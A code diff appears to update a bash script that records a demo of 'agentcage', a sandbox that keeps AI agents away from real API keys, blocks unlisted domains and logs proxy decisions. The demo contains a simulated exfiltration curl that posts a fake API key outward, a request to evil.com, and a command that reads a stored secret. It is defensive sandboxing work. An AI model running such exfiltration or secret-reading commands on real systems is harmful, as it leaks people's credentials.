@@ -33,11 +33,9 @@ note() {
   sleep 1
 }
 
-# ── Grab the real API key from openclaw-svc ──────────────────────────
+# ── Pre-flight (before recording starts visually) ────────────────────
 REAL_KEY=$(sudo -u openclaw-svc podman secret inspect openclaw01.ANTHROPIC_API_KEY --showsecret \
   | python3 -c "import json,sys; print(json.load(sys.stdin)[0]['SecretData'])")
-
-# ── Pre-flight ───────────────────────────────────────────────────────
 agentcage cage destroy demo --yes >/dev/null 2>&1 || true
 rm -f /tmp/cage.yaml
 
@@ -58,6 +56,8 @@ sleep 3
 # ═════════════════════════════════════════════════════════════════════
 banner "1. Write a cage config"
 # ═════════════════════════════════════════════════════════════════════
+
+note "Define the container image, allowed domains, and secret injection rules"
 
 cat > /tmp/cage.yaml <<'YAML'
 name: demo
@@ -88,7 +88,7 @@ run "cat /tmp/cage.yaml"
 banner "2. Store a secret"
 # ═════════════════════════════════════════════════════════════════════
 
-note "The real API key is stored encrypted — the agent never sees it"
+note "Store the real API key — it's encrypted and never reaches the agent"
 type_cmd "agentcage secret set demo ANTHROPIC_API_KEY"
 printf 'sk-ant-••••••••••••••••\n'
 printf "Secret 'demo.ANTHROPIC_API_KEY' set.\n"
@@ -99,25 +99,28 @@ sleep "$PAUSE"
 banner "3. Create the cage"
 # ═════════════════════════════════════════════════════════════════════
 
+note "Spin up 3 containers: agent, DNS sidecar, and inspecting proxy"
 type_cmd "agentcage cage create -c /tmp/cage.yaml"
+printf 'Building images...\n'
 agentcage cage create -c /tmp/cage.yaml >/dev/null 2>&1
 printf 'Started demo-cage\n'
 sleep "$PAUSE"
 
+note "Verify the cage is running"
 run "agentcage cage show demo"
 
 # ═════════════════════════════════════════════════════════════════════
 banner "4. Secret injection"
 # ═════════════════════════════════════════════════════════════════════
 
-note "What does the agent see for its API key?"
+note "Let's see what the agent sees for its API key"
 run "agentcage cage exec demo -- printenv ANTHROPIC_API_KEY"
 
 note "Just a placeholder! The proxy swaps it for the real key on the wire."
 note "The agent can never read, log, or exfiltrate the real credential."
 sleep "$LONG_PAUSE"
 
-note "Proof: agent sends the placeholder, but the API gets the real key"
+note "Let's prove it — call the real Anthropic API from inside the cage"
 
 # Write request body into the cage
 agentcage cage exec demo -- sh -c 'cat > /tmp/request.json << EOF
@@ -134,29 +137,36 @@ agentcage cage exec demo -- sh -c 'curl -s https://api.anthropic.com/v1/messages
   -H "anthropic-version: 2023-06-01" \
   -H "content-type: application/json" \
   -d @/tmp/request.json' 2>&1 | python3 -m json.tool
+sleep 1
+
+note "Real API response! The proxy injected the real key — the agent never had it."
 sleep "$LONG_PAUSE"
 
 # ═════════════════════════════════════════════════════════════════════
 banner "5. Domain filtering"
 # ═════════════════════════════════════════════════════════════════════
 
-note "httpbin.org is on the allowlist → allowed"
+note "httpbin.org is on the allowlist — request goes through"
 run "agentcage cage exec demo -- curl -s -o /dev/null -w '%{http_code}\n' https://httpbin.org/get"
 
-note "evil.com is NOT on the allowlist → blocked"
+note "evil.com is NOT on the allowlist — blocked by the proxy"
 run "agentcage cage exec demo -- curl -s https://evil.com"
 
 # ═════════════════════════════════════════════════════════════════════
 banner "6. Exfiltration detection"
 # ═════════════════════════════════════════════════════════════════════
 
-note "Agent tries to sneak out something that looks like an API key..."
+note "What if the agent tries to leak something that looks like an API key?"
 run "agentcage cage exec demo -- curl -s -X POST https://httpbin.org/post -d 'stolen=sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAA'"
+
+note "Caught! The proxy scans every request body for secret patterns."
+sleep "$PAUSE"
 
 # ═════════════════════════════════════════════════════════════════════
 banner "7. Audit log"
 # ═════════════════════════════════════════════════════════════════════
 
+note "Every proxy decision is logged — allowed, blocked, and why"
 run "agentcage cage audit demo"
 
 # ── Fin ──────────────────────────────────────────────────────────────
